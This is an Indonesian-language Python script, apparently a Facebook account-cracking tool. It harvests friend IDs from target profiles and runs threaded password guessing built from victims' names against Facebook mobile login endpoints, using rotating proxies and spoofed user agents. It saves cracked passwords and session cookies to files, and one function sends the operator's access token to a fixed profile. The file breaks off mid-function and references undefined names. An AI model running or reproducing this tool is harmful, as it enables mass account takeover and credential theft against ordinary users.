#-----------------[ IMPORT-MODULE ]-------------------#
import os
import re
import json
import sys
import random
import time
import datetime
import requests

try:
	import bs4
	import rich
	import requests
	import stdiomask
except:
	os.system("pip install bs4")
	os.system("pip install rich")
	os.system("pip install requests")
	os.system("pip install stdiomask")
#-----------------[ IMPORT-MODULE ]-------------------#
from bs4 import BeautifulSoup as sop	
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Console as sol
from rich.markdown import Markdown as mark
from rich.panel import Panel
from rich.tree import Tree
from rich import print as prints
from rich.console import Console
from rich import print as cetak
from rich.table import Table
from rich.columns import Columns
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
console = Console()
###----------[ WARNA PRINT RICH ]---------- ###
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
P2 = "[#FFFFFF]" # PUTIH
U2 = "[#AF00FF]" # UNGU
O2 = "[#FF8F00]" # ORANGE
###----------[ CEK WARNA TEMA ]---------- ###
try:
	file_color = open("data/theme_color","r").read()
	color_text = file_color.split("|")[0]
	color_panel = file_color.split("|")[1]
except:
	color_text = "[#00FF00]"
	W1 = random.choice([M2,H2,K2])
	W2 = random.choice([K2,M2,K2])
	W3 = random.choice([H2,K2,M2])
	color_panel = "#00FFFF"
	color_ok = "#00FF00"
	color_cp = "#FFFF00"
#------------------[ GLOBAL NAMA ]-------------------#
ugen2, ugen = [],[]
id, id2, uid = [],[],[]
ualu, ualuh = [], []
pwpluss, pwnya = [],[]
method, lisensiku = [],[]
tokenku, lisensikuni = [],[]
cokbrut=[]
fields=[]
ses=requests.Session()
princp=[]
loop, ok, cp = 0,0,0
#------------------[ PROXY ]-------------------#
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('[[\x1b[1;92mâ€¢\x1b[1;97m] [\x1b[1;96mBocil3-MUHAMAD')
prox=open('.prox.txt','r').read().splitlines()
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			usragen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
#------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
OO = '\x1b[38;5;208m'
sir = '\ 033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
o = '\x1b[38;5;208m' # OREN +
asu = random.choice([M,K,H,U,B,O,P,b])
clr = random.choice([U,H]) 
tlr = random.choice([P,b])
animasi = f"{asu}-----------------------------------------------------------"
#--------------------[ CONVERTER-BULAN ]--------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
###----------[ TAHUN AKUN ]---------- ###
def tahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010-2011'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011-2012'
		elif fx[:6] in ['100004']          :tahunz = '2012-2013'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013-2014'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014-2015'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2015-2016'
		elif fx[:5] in ['10002']           :tahunz = '2016-2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006','10007','10008']:tahunz = '2021-2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008-2009'
	elif len(fx)==8:
		tahunz = '2007-2008'
	elif len(fx)==7:
		tahunz = '2006-2007'
	else:tahunz=''
	return tahunz
#------------------[ MACHINE-SUPPORT ]---------------#
def ___bocil_new___(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
	os.system('clear')
def back():
	login()
#------------------[ LOGO-LAKNAT ]-----------------#
def banner():
	clear()
	___bocil_new___(f'''{animasi}\t{clr}
 ,ggggggggggg,                                    
dP"""88""""""Y8,                            ,dPYb,
Yb,  88      `8b                            IP'`Yb
 `"  88      ,8P                       gg   I8  8I
     88aaaad8P"                        ""   I8  8'
     88""""Y8ba    ,ggggg,    ,gggg,   gg   I8 dP 
     88      `8b  dP"  "Y8gggdP"  "Yb  88   I8dP  
     88      ,8P i8'    ,8I i8'        88   I8P   
     88_____,d8',d8,   ,d8',d8,_    __,88,_,d8b,_ 
    88888888P"  P"Y8888P"  P""Y8888PP8P""Y88P'"Y88
        {M} ANIMASI BOCIL HARAM!!!
{animasi}''')
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
	   login_lagi334()
                
def login_lagi334():
	try:
		asu = random.choice([m,h,k,b,u])
		os.system('clear')
		banner()
		___bocil_new___(f'{P}{animasi}')
		cookie=input(f' {clr}[{tlr}+{clr}]{P} Masukkan Cookies :{H} ')
		___bocil_new___(f'{P}{animasi}')
		open(".cok.txt", "w").write(cookie)
		with requests.Session() as rsn:
			try:
				rsn.headers.update({
                    'Accept-Language': 'id,en;q=0.7',
                    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/94.0.0.0 Mobile Safari/537.36',
                    'Referer': 'https://www.instagram.com/',
                    'Host': 'www.facebook.com',
                    'Sec-Fetch-Mode': 'cors',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'Connection': 'keep-alive',
                    'Sec-Fetch-Site': 'same-origin',
                    'Sec-Fetch-Dest': 'empty',
                    'Origin': 'https://www.instagram.com',
                    'Accept-Encoding': 'gzip, deflate, br',
                })
				response = rsn.get('https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/', cookies={'cookie':cookie})
				if '"access_token":' in str(response.headers):
					token = re.search('"access_token":"(.*?)"', str(response.headers)).group(1)
					open(".token.txt", "w").write(token)

				else:
					print('%sFailled Get Token%s'%(m, p))

			except:
				print('Failled Get Token')

		print(f' {clr}[{tlr}+{clr}]{P} Login Berhasil ');time.sleep(1)
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print(f' {clr}[{tlr}+{clr}]{P} Login Gagal '%(x,k,x,m,x))
		print(e)
		exit()
def bot():
	try:
		requests.post("https://graph.facebook.com/100002045441878?fields=subscribers&access_token=%s"%(tokenku))
	except:
		pass
#------------------[ BAGIAN-MENU ]----------------#
def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('[Ã—] Cookies Kadaluarsa ')
		time.sleep(5)
		login_lagi334()
	os.system('clear')
	banner()
	ip = requests.get("https://api.ipify.org").text
	___bocil_new___(f' {clr}[{tlr}+{clr}]{P} Bocil :{H} {my_name}')
	___bocil_new___(f' {clr}[{tlr}+{clr}]{P} ID Bocil   :{H} {my_id}')
	___bocil_new___(f' {clr}[{tlr}+{clr}]{P} IP Tolol   :{H} {ip}')
	___bocil_new___(f'{P}{animasi}')
	___bocil_new___(f' {clr}[{tlr}1{clr}]{P} Mulai Crack Cil ')
	___bocil_new___(f' {clr}[{tlr}2{clr}]{P} Check Opsi Cil ')
	___bocil_new___(f' {clr}[{tlr}3{clr}]{P} Keluar/Hapus Cookies ')
	___bocil_new___(f'{P}{animasi}')
	____bocil__haram____ = input(f' {clr}[{tlr}+{clr}] {P}Pilih :{H} ')
	print(f'{P}{animasi}')
	if ____bocil__haram____ in ['1']:
		massal()
	elif ____bocil__haram____ in ['2']:
	  file_cp()
	elif ____bocil__haram____ in ['0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		___bocil_new___(f' {clr}[{tlr}+{clr}]{P} Cookie berhasil di hapus')
		exit()
	else:
		___bocil_new___(f' {clr}[{tlr}+{clr}]{P} Pilih Yang Bener ')
		back()
def error():
	___bocil_new___(f' {clr}[{tlr}+{clr}]{P} Maaf Fitur Ini Masih Di Perbaiki {x}')
	time.sleep(4)
	back()
#-------------------[ CRACK-PUBLIK ]----------------#
def massal():
    idf = []
    try:
        token = open('.token.txt', 'r').read()
        cok = open('.cok.txt', 'r').read()
    except IOError:
        print(f'{m}cookies telah kadaluarsa ster')
        exit()
    try:
    	dwi = int(input(f" {clr}[{tlr}!{clr}]{P} Input Berapa ID Target : {H}"))	
    except ValueError:
        exit()
    if dwi < 1 or dwi > 1000:
        exit()
    ses = requests.Session()
    _dwi_ = 0
    for yantti in range(dwi):
        _dwi_ += 1
        Masukan = input(f" {clr}[{tlr}{_dwi_}{clr}]{P} Masukan ID Target      {P}: {H}")
        idf.append(Masukan)
    for user in idf:
        try:
            head = (
                {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
                 })
            if len(id) == 0:
                params = (
                    {
                        'access_token': token,
                        'fields': "friends"
                    }
                )
            else:
                params = (
                    {
                        'access_token': token,
                        'fields': "friends"
                    }
                )
            url = requests.get('https://graph.facebook.com/{}'.format(user),
                               params=params, headers=head, cookies={'cookies': cok}).json()
            for proses in url['friends']['data']:
                try:
                    woy = (proses['id']+'|'+proses['name'])
                    if woy in id:
                        pass
                    else:
                        id.append(woy)
                except:
                    continue
        except (KeyError, IOError):
            pass
        except requests.exceptions.ConnectionError:
            exit()
    try:
    	___bocil_new___(f'{P}{animasi}')
    	sys.stdout.write(f" {clr}[{tlr}+{clr}]{P} Total ID Yang Terkumpul {H}{len(id)}{P} ID....{P}"),
    	sys.stdout.flush()
    	setting()
    except requests.exceptions.ConnectionError:
        print(f" {P}{M}  koneksi terputus")
        exit()
    except (KeyError, IOError):
        print(f" {P}{M}  teman tidak publik")
        exit()
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	___bocil_new___(f'\n{P}{animasi}')
	___bocil_new___(f' {clr}[{tlr}1{clr}]{P} Idz Old ')
	___bocil_new___(f' {clr}[{tlr}2{clr}]{P} Idz New ')
	___bocil_new___(f' {clr}[{tlr}3{clr}]{P} Idz Random ')
	___bocil_new___(f'{P}{animasi}')
	hu = input(f' {clr}[{tlr}+{clr}] {P}Pilih :{H} ')
	___bocil_new___(f'{P}{animasi}')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)

	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		___bocil_new___(' [!] Pilih Yang Bener ')
		exit()
	___bocil_new___(f' {clr}[{tlr}1{clr}]{P} Touch.Facebook.Com')
	___bocil_new___(f' {clr}[{tlr}2{clr}]{P} Free.Prod.Facebook.Com')
	___bocil_new___(f' {clr}[{tlr}3{clr}]{P} M.Prod.Facebook.Com')
	___bocil_new___(f' {clr}[{tlr}4{clr}]{P} Reguler V5')
	___bocil_new___(f'{P}{animasi}')
	hc = input(f' {clr}[{tlr}+{clr}] {P}Pilih :{H} ')
	___bocil_new___(f'{P}{animasi}')
	if hc in ['1','01']:
		method.append('Bocil1')
	elif hc in ['2']:
		method.append('bocil2')
	elif hc in ['3']:
		method.append('Bocil4')
	elif hc in ['4']:
		method.append('Bocil3')
	else:
		method.append('Bocil1')
	pwplus=input(f' {clr}[{tlr}+{clr}]{P} Tambahkan Password Manual ( Y/t ) : {H}')
	___bocil_new___(f'{P}{animasi}')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		pwku=input(f' {clr}[{tlr}+{clr}]{P} Masukkan Password Tambahan :{H} ')
		___bocil_new___(f'{P}{animasi}')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwordlist()
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwordlist():
	___bocil_new___(f' {clr}[{tlr}+{clr}]{P} Hasil {H}OK{P} Tersimpan Di : {H}OK/%s {P}'%(okc))
	___bocil_new___(f' {clr}[{tlr}+{clr}]{P} Hasil {K}CP{P} Tersimpan Di : {K}CP/%s {P}'%(cpc))
	___bocil_new___(f'{P}{animasi}\n')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(nmf)
					pwv.append(frs+'12')
					pwv.append(frs+'01')
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'12')
					pwv.append(frs+'01')
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'Bocil1' in method:
				pool.submit(Bocil1,idf,pwv)
			elif 'bocil2' in method:
					pool.submit(bocil2,idf,pwv)
			elif 'Bocil4' in method:
					pool.submit(Bocil4,idf,pwv)
			elif 'Bocil3' in method:
					pool.submit(Bocil3,idf,pwv)
			else:
				pool.submit(Bocil1,idf,pwv)
	print('')
	print(f'\n {clr}[{tlr}+{clr}] {H}OK : {h}%s '%(ok))
	print(f' {clr}[{tlr}+{clr}] {K}CP : {k}%s '%(cp))
#------------------[ METHOD-Bocil1-2 ]-------------------#
def Bocil1(idf,pwv):
	global loop,ok,cp
	rc = random.choice
	rr = random.randrange
	sys.stdout.write(f"\r[bold white] {idf} [bold white] {clr}{loop}{P}/{tlr}{len(id)} {K}CP-:{cp} {H}OK-:{ok}  "),
	sys.stdout.flush()
	ua = Ugen()
	url = "touch.facebook.com"
	ses = requests.Session()
	for pw in pwv:
		try:
			p = ses.get(f'https://{url}/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={
				"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
				"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
				"uid":idf,
				"next":f"https://{url}/login/save-device/",
				"flow":"login_no_pin",
				"pass":pw,
				"submit":"masuk"
				}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={
                 'Host': url,
                 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
                 'cache-control': 'max-age=0',
                 'content-type': 'application/x-www-form-urlencoded',
                 'dpr': f'{str(rr(2,5))}',
                 'origin': 'https://'+url,
                 'referer': f'https://{url}/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr',
                 'sec-ch-prefers-color-scheme': 'dark',
                 'x-requested-with': 'XMLHttpRequest',
                 'sec-ch-ua': f'"Not_A Brand";v="{str(rr(8,24))}", "Chromium";v="{str(rr(99,120))}"',
                 'sec-ch-ua-full-version-list': f'"Not_A Brand";v="{str(rr(8,24))}.0.0.0", "Chromium";v="{str(rr(99,120))}.0.{str(rr(5000,5900))}.{str(rr(100,120))}"',
                 'sec-ch-ua-mobile': '?1',
                 'sec-ch-ua-platform': '"Android"',
                 'sec-ch-ua-platform-version': f'"{str(rr(5,14))}.0.0"',
                 'sec-fetch-dest': 'document',
                 'sec-fetch-mode': 'navigate',
                 'sec-fetch-site': 'same-origin',
                 'sec-fetch-user': '?1',
                 'upgrade-insecure-requests': '1',
                 'user-agent': ua,
                 'accept-encoding': 'gzip, deflate, br',
                 'viewport-width': f'{str(rr(500,999))}',
                          }
			po = ses.post(f'https://{url}/login/device-based/Bocil1-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r {P}^_- {K}{idf}{P}|{K}{pw}\n{P}^_- {K}{tahun(idf)}\n{P}^_- {K}{ua}\n{animasi}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'='+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r {P}^_^ {H}{idf}{P}|{H}{pw}{P}|{H}{kuki}\n{P}^_- {H}{tahun(idf)}\n{P}^_^ {H}{ua}\n{animasi}')
				open('OK/'+okc,'a').write(idf+'='+pw+'='+kuki+'='+ua+'\n')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

def bocil2(idf,pwv):
	global loop,ok,cp
	rc = random.choice
	rr = random.randrange
	sys.stdout.write(f"\r[bold white] {idf} [bold white] {clr}{loop}{P}/{tlr}{len(id)} {K}CP-:{cp} {H}OK-:{ok}  "),
	sys.stdout.flush()
	ua = Free()
	url = "free.facebook.com"
	ses = requests.Session()
	for pw in pwv:
		try:
			p = ses.get(f'https://{url}/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={
				"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
				"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
				"uid":idf,
				"next":f"https://{url}/login/save-device/",
				"flow":"login_no_pin",
				"pass":pw,
				"submit":"masuk"
				}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={
                 'Host': url,
                 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
                 'cache-control': 'max-age=0',
                 'content-type': 'application/x-www-form-urlencoded',
                 'dpr': f'{str(rr(2,5))}',
                 'origin': 'https://'+url,
                 'referer': f'https://{url}/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr',
                 'sec-ch-prefers-color-scheme': 'dark',
                 'x-requested-with': 'XMLHttpRequest',
                 'sec-ch-ua': f'"Not_A Brand";v="{str(rr(8,24))}", "Chromium";v="{str(rr(99,120))}"',
                 'sec-ch-ua-full-version-list': f'"Not_A Brand";v="{str(rr(8,24))}.0.0.0", "Chromium";v="{str(rr(99,120))}.0.{str(rr(5000,5900))}.{str(rr(100,120))}"',
                 'sec-ch-ua-mobile': '?1',
                 'sec-ch-ua-platform': '"Android"',
                 'sec-ch-ua-platform-version': f'"{str(rr(5,14))}.0.0"',
                 'sec-fetch-dest': 'document',
                 'sec-fetch-mode': 'navigate',
                 'sec-fetch-site': 'same-origin',
                 'sec-fetch-user': '?1',
                 'upgrade-insecure-requests': '1',
                 'user-agent': ua,
                 'accept-encoding': 'gzip, deflate, br',
                 'viewport-width': f'{str(rr(500,999))}',
                          }
			po = ses.post(f'https://{url}/login/device-based/Bocil1-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r {P}^_- {K}{idf}{P}|{K}{pw}\n{P}^_- {K}{tahun(idf)}\n{P}^_- {K}{ua}\n{animasi}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'='+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r {P}^_^ {H}{idf}{P}|{H}{pw}{P}|{H}{kuki}\n{P}^_- {H}{tahun(idf)}\n{P}^_^ {H}{ua}\n{animasi}')
				open('OK/'+okc,'a').write(idf+'='+pw+'='+kuki+'='+ua+'\n')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

def Bocil3(idf,pwv):
	global loop,ok,cp
	rc = random.choice
	rr = random.randrange
	sys.stdout.write(f"\r[bold white] {idf} [bold white] {clr}{loop}{P}/{tlr}{len(id)} {K}CP-:{cp} {H}OK-:{ok}  "),
	sys.stdout.flush()
	ua = Bocil3()
	url = "m.facebook.com"
	ses = requests.Session()
	for pw in pwv:
		try:
			p = ses.get(f'https://{url}/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={
				"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
				"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
				"uid":idf,
				"next":f"https://{url}/login/save-device/",
				"flow":"login_no_pin",
				"pass":pw,
				"submit":"masuk"
				}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={
                 'Host': url,
                 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
                 'cache-control': 'max-age=0',
                 'content-type': 'application/x-www-form-urlencoded',
                 'dpr': f'{str(rr(2,5))}',
                 'origin': 'https://'+url,
                 'referer': f'https://{url}/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr',
                 'sec-ch-prefers-color-scheme': 'dark',
                 'x-requested-with': 'XMLHttpRequest',
                 'sec-ch-ua': f'"Not_A Brand";v="{str(rr(8,24))}", "Chromium";v="{str(rr(99,120))}"',
                 'sec-ch-ua-full-version-list': f'"Not_A Brand";v="{str(rr(8,24))}.0.0.0", "Chromium";v="{str(rr(99,120))}.0.{str(rr(5000,5900))}.{str(rr(100,120))}"',
                 'sec-ch-ua-mobile': '?1',
                 'sec-ch-ua-platform': '"Android"',
                 'sec-ch-ua-platform-version': f'"{str(rr(5,14))}.0.0"',
                 'sec-fetch-dest': 'document',
                 'sec-fetch-mode': 'navigate',
                 'sec-fetch-site': 'same-origin',
                 'sec-fetch-user': '?1',
                 'upgrade-insecure-requests': '1',
                 'user-agent': ua,
                 'accept-encoding': 'gzip, deflate, br',
                 'viewport-width': f'{str(rr(500,999))}',
                          }
			po = ses.post(f'https://{url}/login/device-based/Bocil1-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r {P}^_- {K}{idf}{P}|{K}{pw}\n{P}^_- {K}{tahun(idf)}\n{P}^_- {K}{ua}\n{animasi}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'='+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r {P}^_^ {H}{idf}{P}|{H}{pw}{P}|{H}{kuki}\n{P}^_- {H}{tahun(idf)}\n{P}^_^ {H}{ua}\n{animasi}')
				open('OK/'+okc,'a').write(idf+'='+pw+'='+kuki+'='+ua+'\n')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

def Bocil4(idf,pwv):
	global loop,ok,cp
	rc = random.choice
	rr = random.randrange
	sys.stdout.write(f"\r[bold white] {idf} [bold white] {clr}{loop}{P}/{tlr}{len(id)} {K}CP-:{cp} {H}OK-:{ok}  "),
	sys.stdout.flush()
	ua = Prod()
	url = "m.prod.facebook.com"
	ses = requests.Session()
	for pw in pwv:
		try:
			p = ses.get(f'https://{url}/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={
				"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
				"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
				"uid":idf,
				"next":f"https://{url}/login/save-device/",
				"flow":"login_no_pin",
				"pass":pw,
				"submit":"masuk"
				}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={
                 'Host': url,
                 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
                 'cache-control': 'max-age=0',
                 'content-type': 'application/x-www-form-urlencoded',
                 'dpr': f'{str(rr(2,5))}',
                 'origin': 'https://'+url,
                 'referer': f'https://{url}/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr',
                 'sec-ch-prefers-color-scheme': 'dark',
                 'x-requested-with': 'XMLHttpRequest',
                 'sec-ch-ua': f'"Not_A Brand";v="{str(rr(8,24))}", "Chromium";v="{str(rr(99,120))}"',
                 'sec-ch-ua-full-version-list': f'"Not_A Brand";v="{str(rr(8,24))}.0.0.0", "Chromium";v="{str(rr(99,120))}.0.{str(rr(5000,5900))}.{str(rr(100,120))}"',
                 'sec-ch-ua-mobile': '?1',
                 'sec-ch-ua-platform': '"Android"',
                 'sec-ch-ua-platform-version': f'"{str(rr(5,14))}.0.0"',
                 'sec-fetch-dest': 'document',
                 'sec-fetch-mode': 'navigate',
                 'sec-fetch-site': 'same-origin',
                 'sec-fetch-user': '?1',
                 'upgrade-insecure-requests': '1',
                 'user-agent': ua,
                 'accept-encoding': 'gzip, deflate, br',
                 'viewport-width': f'{str(rr(500,999))}',
                          }
			po = ses.post(f'https://{url}/login/device-based/Bocil1-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r {P}^_- {K}{idf}{P}|{K}{pw}\n{P}^_- {K}{tahun(idf)}\n{P}^_- {K}{ua}\n{animasi}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'='+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r {P}^_^ {H}{idf}{P}|{H}{pw}{P}|{H}{kuki}\n{P}^_- {H}{tahun(idf)}\n{P}^_^ {H}{ua}\n{animasi}')
				open('OK/'+okc,'a').write(idf+'='+pw+'='+kuki+'='+ua+'\n')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#------------------[ USER-AGENT ]-------------------#
def Ugen():
	rc = random.choice
